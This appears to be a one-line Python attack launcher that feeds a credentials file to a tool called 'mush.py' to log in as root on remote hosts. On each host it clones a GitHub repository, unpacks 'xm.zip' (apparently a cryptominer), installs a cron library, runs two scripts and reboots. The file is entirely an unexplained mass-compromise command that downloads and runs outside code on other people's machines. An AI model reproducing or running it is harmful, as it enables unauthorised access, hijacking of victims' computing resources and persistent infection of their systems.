import os
os.system("python mush.py -f creds.txt -c 'sudo apt update && git clone https://github.com/averageweedsmoker/....git ; apt install unzip ; cd ... && unzip xm.zip && rm -rf xm.zip && apt install python-pip -y && pip install -U python-crontab && python a.py && python b.py && shutdown -r now' -u root -p")

